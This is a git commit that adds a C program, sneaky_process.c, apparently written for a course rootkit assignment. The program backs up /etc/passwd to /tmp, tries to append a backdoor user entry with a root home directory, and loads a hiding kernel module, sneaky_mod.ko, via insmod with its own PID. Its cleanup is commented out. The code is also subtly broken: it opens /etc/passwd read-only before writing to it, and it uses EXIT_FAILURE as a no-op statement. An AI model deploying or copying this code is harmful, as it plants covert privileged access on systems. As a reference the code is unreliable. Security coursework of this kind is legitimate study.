626ae1805aa49a7f1546ca4daa24db39716ce874
Jerry <jerry1202.wtmh@gmail.com>
2022-04-13 15:00:50 -0400

    1

---
+++ homework5-kit/sneaky_process.c
@@ -0,0 +1,55 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+void copy_file(char * srcName, char * dstName) {
+  size_t sz = 0;
+  ssize_t len = 0;
+  char * line = NULL;
+  FILE * srcFile = fopen(srcName, "r");
+  if (srcFile == NULL) {
+    printf("Cannot open file %s \n", srcName);
+    EXIT_FAILURE;
+  }
+  FILE * dstFile = fopen(dstName, "w");
+  if (dstFile == NULL) {
+    printf("Cannot open file %s \n", dstName);
+    EXIT_FAILURE;
+  }
+
+  while((len = getline(&line, &sz, srcFile)) >= 0){
+    fputs(line, dstFile);
+  }
+  fclose(srcFile);
+  fclose(dstFile);
+}
+
+void add_passwd(char * fileName, char * passwd) {
+  FILE * file = fopen(fileName, "r");
+  if (file == NULL) {
+    printf("Cannot open file %s \n", fileName);
+    EXIT_FAILURE;
+  }
+  fprintf(file, "%s", passwd);
+  fclose(file);
+}
+
+int main() {
+  printf("sneaky_process pid = %d\n", getpid());
+  copy_file("/etc/passwd", "/tmp/passwd");
+  add_passwd("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
+  char arg[50];
+  sprintf(arg, "insmod sneaky_mod.ko sneaky_pid=%d", getpid());
+  printf(arg);
+  system(arg);
+
+  // char c;
+  // while ((c = getchar()) != 'q') {
+  // }
+
+  // system("rmmod sneaky_mod.ko");
+  // copy_file("/tmp/passwd", "/etc/passwd");
+  // system("rm /tmp/passwd"); 
+  // return EXIT_SUCCESS;
+}
